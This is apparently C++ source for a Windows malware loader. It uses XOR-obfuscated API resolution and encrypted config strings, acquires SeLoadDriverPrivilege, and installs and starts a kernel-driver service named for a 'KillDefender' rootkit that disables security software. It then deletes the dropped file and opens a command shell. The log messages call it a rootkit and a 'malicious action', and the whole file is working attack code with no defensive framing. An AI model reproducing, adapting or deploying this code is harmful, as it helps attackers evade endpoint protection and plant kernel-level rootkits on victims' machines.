#include <Windows.h>
#include "MemOps.h"
#include "StringCrypt.h"
#include "Config.h"
#include "DynLibResolver.h"
#include "Privileges.h"
#include "Log.h"

static HANDLE hCurrentProcessHeap;
static HANDLE hCurrentProcess;

#ifndef _USELOG
#define LogInfo(l,f,...)
#define Log(l,p,f,...)
#define InitLog(l) TRUE
#define LogClose(l) TRUE
#else
static Logger logger = { NULL };
#endif

//load driver from C:\Users\Public\ 
BOOL InstallKillDefenderDriver()
{
    SC_HANDLE       hScManager, hService;
    CHAR            *pRootkitBasePath, *pRootkitDropPath;
    BOOL            bRet = TRUE;
    DWORD           dwRootkitDropPathLen = DWORD(MAX_PATH + str_len(g_rootkit_filename.pEncrypted));

    hScManager = hService = NULL;

    DecryptConfig(&g_rootkit_filename);
    DecryptConfig(&g_rootkit_name);
    DecryptConfig(&g_rootkit_drop_dest);
    DecryptConfig(&g_public_profile);

    pRootkitBasePath = (CHAR*)((fp_HeapAlloc)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]), 
                XorDecryptString(p_FunctionTable[FunctionEntry::_HeapAlloc])))(hCurrentProcessHeap, HEAP_ZERO_MEMORY, dwRootkitDropPathLen);

    dwRootkitDropPathLen = MAX_PATH + (DWORD)(str_len(g_rootkit_drop_dest.pEncrypted) + str_len((PBYTE)g_rootkit_filename.pszDecrypted)) + 1;

    pRootkitDropPath = (CHAR*)((fp_HeapAlloc)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_HeapAlloc])))(hCurrentProcessHeap, HEAP_ZERO_MEMORY, dwRootkitDropPathLen);

    //if (!((fp_GetWindowsDirectoryA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
    //    XorDecryptString(p_FunctionTable[FunctionEntry::_GetWindowsDirectoryA])))(pRootkitDropPath, MAX_PATH)) 
    //{
    //    bRet = FALSE;
    //    goto clean_up;
    //}

    //mem_cpy((PBYTE)g_rootkit_drop_dest.pszDecrypted, (PBYTE)(pRootkitDropPath + str_len(pRootkitDropPath)), str_len((PBYTE)g_rootkit_drop_dest.pszDecrypted) + 1);

    //*(PBYTE)(pRootkitDropPath + str_len(pRootkitDropPath)) = '\\';

    if (pRootkitBasePath == NULL || pRootkitDropPath == NULL)
    {
        bRet = FALSE;
        goto clean_up;
    }

    if(!((fp_GetTempPathA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]), 
        XorDecryptString(p_FunctionTable[FunctionEntry::_GetTempPathA])))(dwRootkitDropPathLen, pRootkitBasePath))
    {
        bRet = FALSE;
        goto clean_up;
    }
  
    mem_cpy((PBYTE)g_public_profile.pszDecrypted, (PBYTE)pRootkitDropPath, str_len(g_public_profile.pszDecrypted));
    mem_cpy((PBYTE)g_rootkit_filename.pszDecrypted, (PBYTE)(pRootkitBasePath + str_len((PBYTE)pRootkitBasePath)), str_len(g_rootkit_filename.pszDecrypted));
    mem_cpy((PBYTE)g_rootkit_filename.pszDecrypted, (PBYTE)(pRootkitDropPath + str_len((PBYTE)pRootkitDropPath)), str_len(g_rootkit_filename.pszDecrypted));

    //if (!_CopyFile(pRootkitBasePath, pRootkitDropPath))
    //{
    //    bRet = FALSE;
    //    LogInfo(&logger, "Failed to drop rootkit Error: %ld\n", GetLastError());
    //    goto clean_up;
    //}

    hScManager = ((fp_OpenSCManagerA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_OpenSCManagerA])))(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    if (hScManager)
    {
        hService = ((fp_CreateServiceA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_CreateServiceA])))(hScManager,
            g_rootkit_name.pszDecrypted,
            g_rootkit_name.pszDecrypted,
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            pRootkitDropPath,
            NULL,NULL,NULL,NULL,NULL);

        if (hService == NULL)
        {
            bRet = FALSE;
            LogInfo(&logger, "Failed to create KillDefender service Error: %ld\n", GetLastError());
            goto clean_up;
        }
        //start the service right away after we added it
        if (!((fp_StartServiceA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_StartServiceA])))(hService, 0, NULL))
        {
            bRet = FALSE;
            LogInfo(&logger, "Failed to Start Service Error: %ld\n", GetLastError());
            goto clean_up;
        }
    }
    else
    {
        LogInfo(&logger, "Failed to open SC manager error: %ld\n", GetLastError());
        bRet = FALSE;
    }

clean_up:

    if(hService != NULL) ((fp_CloseServiceHandle)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_CloseServiceHandle])))(hService);

    if(hScManager != NULL) ((fp_CloseServiceHandle)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_CloseServiceHandle])))(hScManager);

    if (!((fp_DeleteFileA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_DeleteFileA])))(pRootkitDropPath)) bRet = FALSE;

    ((fp_HeapFree)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]), 
                XorDecryptString(p_FunctionTable[FunctionEntry::_HeapFree])))(hCurrentProcessHeap, 0, pRootkitDropPath);
    ((fp_HeapFree)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_HeapFree])))(hCurrentProcessHeap, 0, pRootkitBasePath);

    return bRet;
}


BOOL Init()
{
    DWORD dwCurrentProcessId;

    hCurrentProcessHeap = ((fp_GetProcessHeap)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_GetProcessHeap])))();
     
    hCurrentProcess = ((fp_GetCurrentProcess)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_GetCurrentProcess])))();

    return TRUE;
}

int main()
{
    RequestPrivilegeSet RequestPrivilege;

    if (!InitFuncResolver()) return -1;

    if (!Init()) return -1;

    if (!InitRequestPrivilegeSet(&RequestPrivilege)) return -1;

    if (!InitLog(&logger)) return -1;

    //request SeDebugPrivilege
    BOOL bRetReqPriv = AddRequestPrivilege(&RequestPrivilege, _SeLoadDriverPrivilege, hCurrentProcessHeap);

    DecryptPrivilegeSet(&RequestPrivilege);

    if (InstallKillDefenderDriver())
    {
        LogInfo(&logger, "Install rootkit sucessfully\n");

        STARTUPINFOA si = {};
        PROCESS_INFORMATION pi = {};

        CreateProcessA(NULL, (CHAR*)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);

    }
    else
    {
        LogInfo(&logger, "Failed to run malicious action\n");
    }

    LogClose(&logger);

    return 1;
}